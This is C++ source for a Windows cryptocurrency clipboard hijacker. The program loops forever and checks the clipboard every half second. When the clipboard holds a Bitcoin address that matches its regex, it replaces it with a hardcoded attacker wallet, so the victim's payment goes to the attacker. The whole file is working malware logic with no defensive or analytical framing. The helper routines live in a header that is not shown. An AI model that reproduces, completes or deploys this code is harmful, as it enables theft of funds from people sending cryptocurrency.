#include "clipboard.h"

//Crypto Wallets
#define BTC_ADDRESS "bc1ecjk2d5hp8svdl2tfmqg9hh5m4g83k7cdkas2d6"

//bc1ecjk2d5hp8svwlwtfmqg9hm5m4g83k7c1kas2ps //Address for tests

//Regular Expressions
std::regex btc_Regex("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$");

//Clipboard modification counter
DWORD clipboardState = 0;

int main()
{
	while (true) {
		Sleep(500);// (1000ms = 1s)

		/* Check for Clipboard changes */
		if (clipboardState == GetClipboardSequenceNumber()) {
			//No changes
			continue;
		}
		else {
			//Changes appeared
			clipboardState = Clipboard_MarkChanges(clipboardState);
		}

		/* Open Clipboard */
		if (!OpenClipboard(NULL))
			continue;

		/* Check that Clipboard Buffer contains BTC Wallet */
		if (!Clipboard_CompareToRegex(Clipboard_ReadData(), btc_Regex)) {
			CloseClipboard();
			continue;
		}

		/* Check that Clipboard Buffer contains different BTC Wallet */
		if (Clipboard_WalletIsDifferent(BTC_ADDRESS)) {
			Clipboard_ReplaceWallet(BTC_ADDRESS); //Change clipboard buffer to template
			clipboardState = Clipboard_MarkChanges(clipboardState); //Mark clipboardState with new value after replacing by tempalte
		}
		else {
			CloseClipboard();
		}
	}

	return 0;
}